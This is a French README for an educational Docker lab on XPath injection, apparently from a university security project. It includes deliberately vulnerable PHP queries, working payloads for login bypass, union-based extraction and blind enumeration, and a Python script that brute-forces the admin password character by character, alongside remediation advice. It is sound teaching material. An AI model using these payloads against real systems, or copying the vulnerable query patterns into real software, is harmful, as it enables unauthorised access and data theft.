# Lab DIABLE - XPath Injection

**Version:** 1.0  
**Auteur:** Kennedy

**Projet:** Lab DIABLE v3.0 - DSI ISFA 2025-2026  
**Tag:** XML  
**Difficulté:** Moyen

---

## 📋 Description

Ce container pédagogique permet d'explorer les vulnérabilités **XPath Injection** dans les applications web utilisant XML comme base de données. À travers trois scénarios progressifs, vous apprendrez à identifier, exploiter et corriger ces vulnérabilités critiques.

XPath Injection est une technique d'attaque similaire à SQL Injection, mais ciblant les requêtes XPath utilisées pour interroger des documents XML.

---

## 🎯 Objectifs pédagogiques

- Comprendre le fonctionnement de XPath et sa syntaxe
- Identifier les vulnérabilités dans les requêtes XPath dynamiques
- Contourner l'authentification via injection XPath
- Extraire des données XML sensibles avec des techniques union-based
- Énumérer la structure XML via Blind XPath Injection
- Apprendre les bonnes pratiques de sécurisation

---

## 🚀 Installation et démarrage

### Prérequis

- Docker Desktop (Windows/Mac) ou Docker Engine (Linux)
- 500 MB d'espace disque
- Port 8081 disponible

### Démarrage rapide

```bash
# Cloner le repository
git clone https://github.com/tsubasa1123/xpath-injection-lab.git
cd xpath-injection-lab

# Lancer avec Docker Compose
docker-compose up -d

# Accéder au lab
http://localhost:8081
```

### Build manuel

```bash
# Builder l'image
docker build -t diable/xpath-injection-lab .

# Lancer le container
docker run -d -p 8081:80 --name xpath-lab diable/xpath-injection-lab

# Vérifier le statut
docker ps
curl http://localhost:8081/health.php
```

---

## 📂 Structure du projet

```
xpath-injection-lab/
├── Dockerfile                  # Image Docker
├── docker-compose.yml          # Configuration Docker Compose
├── .dockerignore              # Exclusions Docker
├── README.md                  # Ce fichier
├── src/                       # Code source PHP
│   ├── config.php            # Configuration et utilitaires
│   ├── init_data.php         # Initialisation des données XML
│   ├── index.php             # Page d'accueil
│   ├── login.php             # Scénario 1 - Login Bypass
│   ├── dashboard.php         # Dashboard utilisateur
│   ├── search.php            # Scénario 2 - Data Extraction
│   ├── products.php          # Scénario 3 - Blind XPath
│   ├── admin.php             # Panel administrateur
│   ├── logout.php            # Déconnexion
│   ├── health.php            # Health check
│   ├── reset.php             # Reset des données
│   └── style.css             # Thème sombre
└── docs/                      # Documentation WP1 (breakdown)
```

---

## 🎓 Scénarios disponibles

### Scénario 1: Login Bypass (Facile)

**Objectif:** Se connecter en tant qu'administrateur sans connaître le mot de passe

**Cible:** `/login.php`

**Technique:** Injection XPath avec opérateur `or`

**Vulnérabilité:**
```php
$query = "//user[username='$username' and password='$password']";
```

**Payload:**
```
Username: ' or '1'='1
Password: ' or '1'='1
```

**Résultat:** Connexion réussie comme admin avec accès au FLAG

---

### Scénario 2: Data Extraction (Moyen)

**Objectif:** Extraire les secrets de tous les utilisateurs depuis `secrets.xml`

**Cible:** `/search.php`

**Technique:** Union-based XPath Injection avec opérateur `|`

**Vulnérabilité:**
```php
$query = "//user[contains(username, '$search')]";
```

**Payload:**
```
')]|//secret[('1'='1
```

**Requête résultante:**
```xpath
//user[contains(username, '')]|//secret[('1'='1')]
```

**Résultat:** Affichage de tous les secrets dans les colonnes du tableau

---

### Scénario 3: Blind XPath Injection (Avancé)

**Objectif:** Énumérer des données XML caractère par caractère

**Cible:** `/products.php`

**Technique:** Blind XPath avec `substring()`

**Vulnérabilité:**
```php
$query = "//product[id='$id']";
// Affiche uniquement "Produit trouvé" ou "Produit non trouvé"
```

**Payload d'énumération:**
```
1' and substring(//user[username='admin']/password, 1, 1)='a
```

**Processus:**
1. Tester chaque caractère de a à z
2. Si "Produit trouvé" → caractère correct
3. Passer au caractère suivant
4. Répéter jusqu'à obtenir le mot de passe complet

**Script d'automatisation Python:**
```python
import requests

def extract_password():
    password = ""
    url = "http://localhost:8081/products.php"
    
    for position in range(1, 20):
        for char in "abcdefghijklmnopqrstuvwxyz0123456789":
            payload = f"1' and substring(//user[username='admin']/password, {position}, 1)='{char}"
            response = requests.get(url, params={'id': payload})
            
            if "Produit trouvé" in response.text:
                password += char
                print(f"Position {position}: {char} → {password}")
                break
        else:
            break  # Fin du mot de passe
    
    return password

print("Password admin:", extract_password())
```

---

## 🔐 Comptes de test

| Username | Password | Rôle |
|----------|----------|------|
| admin | ??? | Administrateur |
| user | password | Utilisateur |
| alice | alice2024 | Utilisateur |
| bob | bobsecure | Utilisateur |
| charlie | charlie!pass | Modérateur |

**Objectif:** Accéder au compte `admin` sans connaître le mot de passe !

---

## 📚 Théorie: XPath Injection

### Qu'est-ce que XPath ?

XPath (XML Path Language) est un langage de requête pour naviguer dans les documents XML. Il permet de sélectionner des nœuds basés sur des critères.

**Exemple de requête XPath:**
```xpath
//user[username='admin' and password='secret']
```

Cette requête sélectionne tous les nœuds `<user>` dont le `username` est 'admin' ET le `password` est 'secret'.

### Syntaxe XPath de base

- `//element` : Sélectionner tous les éléments
- `element[@attribut='valeur']` : Filtrer par attribut
- `element[condition]` : Filtrer par condition
- `and` / `or` : Opérateurs logiques
- `|` : Union (combiner plusieurs requêtes)
- `substring(string, start, length)` : Extraire une sous-chaîne
- `string-length(string)` : Longueur d'une chaîne
- `contains(string, substring)` : Vérifier si contient

### Différences avec SQL

| Aspect | SQL | XPath |
|--------|-----|-------|
| **Commentaires** | `--`, `#`, `/* */` | ❌ Pas de commentaires |
| **Union** | `UNION SELECT` | `\|` (pipe) |
| **String functions** | `SUBSTRING()`, `LENGTH()` | `substring()`, `string-length()` |
| **Toujours vrai** | `1=1` ou `'a'='a'` | `'1'='1'` |

---

## 🛡️ Mesures de protection

### 1. Validation stricte des entrées (Priorité 1)

```php
// Valider le format attendu
if (!preg_match('/^[a-zA-Z0-9_-]+$/', $username)) {
    die("Format invalide");
}

// Limiter la longueur
if (strlen($username) > 50) {
    die("Trop long");
}
```

### 2. Échappement des caractères spéciaux

```php
// Échapper les apostrophes
$username = str_replace("'", "&apos;", $username);
$password = str_replace("'", "&apos;", $password);

// Supprimer les caractères dangereux
$search = str_replace(["'", "]", "[", "|", "(", ")"], "", $search);
```

### 3. Utiliser des requêtes paramétrées (si disponible)

Certaines bibliothèques XML modernes offrent des requêtes préparées. Préférez-les quand c'est possible.

### 4. Principe du moindre privilège

Limitez les permissions de lecture sur les fichiers XML sensibles.

### 5. Ne pas révéler d'informations

```php
// ❌ Mauvais - révèle la structure
if ($error) {
    echo "XPath Error: " . $error->getMessage();
}

// ✅ Bon - message générique
if ($error) {
    echo "Une erreur est survenue";
    error_log("XPath Error: " . $error->getMessage());
}
```

---

## 🔧 Commandes utiles

```bash
# Voir les logs en temps réel
docker logs -f xpath-lab

# Accéder au container
docker exec -it xpath-lab bash

# Voir les fichiers XML
docker exec xpath-lab cat /var/www/html/data/users.xml

# Réinitialiser les données
curl http://localhost:8081/reset.php

# Health check
curl http://localhost:8081/health.php

# Arrêter le container
docker stop xpath-lab

# Supprimer le container
docker rm xpath-lab

# Rebuild complet
docker-compose down
docker-compose build --no-cache
docker-compose up -d
```

---

## 📊 Statistiques

- **16 fichiers** créés
- **3 scénarios** d'attaque progressifs
- **5 utilisateurs** de test
- **5 secrets** à découvrir
- **5 produits** dans le catalogue
- **Temps de développement:** ~6 heures

---

## 🎓 Ressources pédagogiques

### Documentation officielle

- [W3C XPath Specification](https://www.w3.org/TR/xpath/)
- [OWASP XPath Injection](https://owasp.org/www-community/attacks/XPATH_Injection)

### Tutoriels recommandés

- [PortSwigger XPath Injection](https://portswigger.net/web-security/xpath-injection)
- [HackTricks XPath Injection](https://book.hacktricks.xyz/pentesting-web/xpath-injection)

### Labs similaires

- DVWA (Damn Vulnerable Web Application)
- WebGoat (OWASP)
- bWAPP

---

## 🐛 Dépannage

### Le container ne démarre pas

```bash
# Vérifier les logs
docker logs xpath-lab

# Vérifier le port 8081
netstat -an | grep 8081  # Windows: netstat -an | findstr 8081

# Changer le port si nécessaire
docker run -d -p 8082:80 --name xpath-lab diable/xpath-injection-lab
```

### Erreur "Fichier XML non trouvé"

```bash
# Réinitialiser les données
docker exec xpath-lab php /var/www/html/init_data.php

# Ou via l'interface web
curl http://localhost:8081/reset.php
```

### Le health check échoue

```bash
# Vérifier le statut
curl http://localhost:8081/health.php | jq .

# Vérifier les permissions
docker exec xpath-lab ls -la /var/www/html/data/
```

---

## 📝 Notes de développement

### Technologies utilisées

- **PHP 8.1** : Langage serveur
- **Apache 2.4** : Serveur web
- **DOM PHP Extension** : Manipulation XML
- **XPath PHP** : Requêtes XPath
- **Docker** : Conteneurisation

### Architecture

L'application utilise des fichiers XML plats comme "base de données":

- `data/users.xml` : Comptes utilisateurs
- `data/secrets.xml` : Données sensibles
- `data/products.xml` : Catalogue produits

Chaque requête XPath est volontairement vulnérable à des fins pédagogiques.

---

## 🤝 Contribution au projet DIABLE

Ce container constitue ma deuxième contribution au Work Package 3 (Containers + documentation):

- **Container SQL Injection** : `sqli-comments-lab`
- **Container XPath Injection** : `xpath-injection-lab`

Les deux containers partagent:
- Le même thème visuel (palette sombre DIABLE)
- Une structure de projet similaire
- Une progression pédagogique cohérente
- Une documentation exhaustive

---

## 📄 Licence

Ce lab a été développé dans un cadre pédagogique pour le projet DIABLE v3.0 (DSI ISFA 2025-2026).

**⚠️ Avertissement:** Ce lab contient des vulnérabilités **intentionnelles** à des fins éducatives. Ne JAMAIS déployer ce code en production.

---

## 👤 Auteur

**Kennedy**  
DSI ISFA 2025-2026  

---

## 🔗 Liens utiles

- Repository GitHub: https://github.com/tsubasa1123/xpath-injection-lab
- Container SQL Injection: https://github.com/tsubasa1123/sqli-comments-lab
- OWASP Top 10: https://owasp.org/www-project-top-ten/

---

**Bon apprentissage ! 🎓**
